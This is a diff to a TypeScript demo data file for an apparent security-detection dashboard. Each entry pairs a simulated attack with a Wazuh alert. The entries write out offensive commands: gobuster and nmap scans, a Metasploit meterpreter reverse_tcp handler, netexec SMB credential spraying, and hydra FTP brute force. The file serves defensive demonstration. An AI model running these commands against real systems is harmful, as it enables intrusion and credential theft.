+++ src/data/demo-coverage.ts
@@ -19,7 +19,7 @@ export const DEMO_DETECTED: DetectedAttack[] = [
   { id: "ATK-04", time: "14:09:30", tool: "gobuster",   technique: "T1083", techniqueName: "Découverte de fichiers et répertoires", delaySeconds: 88, command: "gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirbuster/big.txt",                              sourceIp: "192.168.1.100", targetIp: "10.0.0.5",    alert: { id: "ALR-04", ruleId: "31101", ruleName: "Scanner web — Énumération de répertoires", severity: "MEDIUM", time: "14:10:58", agent: "wazuh-agent-03", description: "Plus de 3 400 requêtes sur Apache access.log depuis 192.168.1.100. Bruteforce de répertoires confirmé." } },
   { id: "ATK-05", time: "14:11:00", tool: "metasploit", technique: "T1210", techniqueName: "Exploitation de services distants",     delaySeconds: 32,  command: "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.100; run",  sourceIp: "192.168.1.100", targetIp: "10.0.0.5",    alert: { id: "ALR-05", ruleId: "31106", ruleName: "Exploitation de service détectée — Metasploit", severity: "HIGH", time: "14:11:32", agent: "wazuh-agent-03", description: "Session Meterpreter établie depuis 192.168.1.100 vers 10.0.0.5. Payload reverse_tcp identifié par Wazuh HIDS." } },
   { id: "ATK-07", time: "14:14:20", tool: "nmap",       technique: "T1046", techniqueName: "Balayage des services réseau — UDP",   delaySeconds: 28,  command: "nmap -sU --top-ports 200 --open 10.0.0.0/24",                                                            sourceIp: "192.168.1.100", targetIp: "10.0.0.0/24", alert: { id: "ALR-07", ruleId: "40102", ruleName: "Balayage de ports UDP détecté",          severity: "MEDIUM",   time: "14:14:48", agent: "wazuh-agent-01", description: "Balayage UDP depuis 192.168.1.100, 200 ports principaux. Règle Snort 1:10001 déclenchée." } },
-  { id: "ATK-09", time: "14:18:00", tool: "netexec",    technique: "T1021", techniqueName: "Accès aux services distants — SMB",    delaySeconds: 105, command: "netexec smb 10.0.0.0/24 -u admin -p Password123 --shares",                                              sourceIp: "192.168.1.100", targetIp: "10.0.0.0/24", alert: { id: "ALR-09", ruleId: "31151", ruleName: "Mouvement latéral SMB détecté — NetExec", severity: "CRITICAL", time: "14:19:45", agent: "wazuh-agent-02", description: "Tentatives d'authentification SMB massives depuis 192.168.1.100. Partages réseau énumérés sur 10.0.0.0/24. Credential stuffing SMB confirmé." } },
+  { id: "ATK-09", time: "14:18:00", tool: "netexec",    technique: "T1021", techniqueName: "Accès aux services distants — SMB",    delaySeconds: 135, command: "netexec smb 10.0.0.0/24 -u admin -p Password123 --shares",                                              sourceIp: "192.168.1.100", targetIp: "10.0.0.0/24", alert: { id: "ALR-09", ruleId: "31151", ruleName: "Mouvement latéral SMB détecté — NetExec", severity: "CRITICAL", time: "14:20:15", agent: "wazuh-agent-02", description: "Tentatives d'authentification SMB massives depuis 192.168.1.100. Partages réseau énumérés sur 10.0.0.0/24. Credential stuffing SMB confirmé." } },
   { id: "ATK-10", time: "14:20:45", tool: "hydra",      technique: "T1110", techniqueName: "Force brute — FTP",                    delaySeconds: 22,  command: "hydra -L users.txt -P passwords.txt -t 16 ftp://10.0.0.4",                                               sourceIp: "192.168.1.100", targetIp: "10.0.0.4",    alert: { id: "ALR-10", ruleId: "5701",  ruleName: "Échecs multiples de connexion FTP",    severity: "HIGH",     time: "14:21:07", agent: "wazuh-agent-02", description: "Force brute FTP : 312 échecs en 18s. Seuil vsftpd dépassé. Credential stuffing confirmé." } },
 ];
